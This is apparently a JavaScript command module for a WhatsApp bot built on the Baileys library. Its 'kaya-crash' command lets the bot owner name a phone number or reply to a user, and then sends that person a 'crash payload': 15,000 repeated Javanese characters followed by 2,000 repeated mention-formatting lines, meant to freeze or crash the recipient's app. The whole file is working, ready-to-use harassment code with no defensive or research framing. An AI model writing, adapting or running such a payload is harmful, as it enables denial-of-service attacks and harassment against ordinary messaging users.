import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
import { getBotName, sendWithBotImage } from '../setting/botAssets.js';
import { getContextInfo } from '../setting/contextInfo.js';

export default {
    name: 'kaya-crash',
    description: '💥 Execute crash payloads on a specified target',
    category: 'Owner',

    async execute(kaya, mek, from, args, prefix) {
        try {
            const botId = kaya.user?.id ? kaya.user.id.split(':')[0].replace(/[^0-9]/g, '') : '';
            const senderJid = mek.sender || mek.key.participant || mek.key.remoteJid || '';
            const senderId = senderJid.split(':')[0].replace(/[^0-9]/g, '');
            const isOwner = senderId === botId;
            const botName = getBotName(mek.sender);

            if (!isOwner) {
                return await sendWithBotImage(kaya, from, mek.sender, { text: `❌ Only the bot owner can execute this command.` }, { quoted: mek });
            }

            let inputTarget = args[0];
            if (!inputTarget && mek.message?.extendedTextMessage?.contextInfo?.participant) {
                inputTarget = mek.message.extendedTextMessage.contextInfo.participant;
            } else if (!inputTarget && mek.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
                inputTarget = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
            }

            if (!inputTarget) {
                const usageText = `▉ \`${botName}\` ▉\n▰▰▰▰▰▰▰▰▰▰▰▰▰\n*💥 CRASH COMMAND*\n\nUsage:\n• \`${prefix}kaya-crash <phone_number>\`\n• Or reply to a user's message with \`${prefix}kaya-crash\``;
                return await sendWithBotImage(kaya, from, mek.sender, { caption: usageText, contextInfo: getContextInfo(mek.sender) }, { quoted: mek });
            }

            let target = inputTarget.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

            await kaya.sendMessage(from, { text: `⚡ Sending payload to ${inputTarget}...` }, { quoted: mek });

            // Envoi d'une charge directe (texte lourd / zalgos) directement dans le chat de la cible
            const heavyPayload = 'ꦽ'.repeat(15000) + ' _*💥 KAYA-MD CRASH PAYLOAD*_\n' + '_*~@8~*_\n'.repeat(2000);
            
            await kaya.sendMessage(target, { text: heavyPayload });

            return await kaya.sendMessage(from, { text: `✅ Payload successfully sent to ${inputTarget}.` }, { quoted: mek });

        } catch (err) {
            console.error('❌ Error in kaya-crash:', err);
            await kaya.sendMessage(from, { text: `⚠️ An error occurred while executing the crash: ${err.message}` }, { quoted: mek });
        }
    }
};
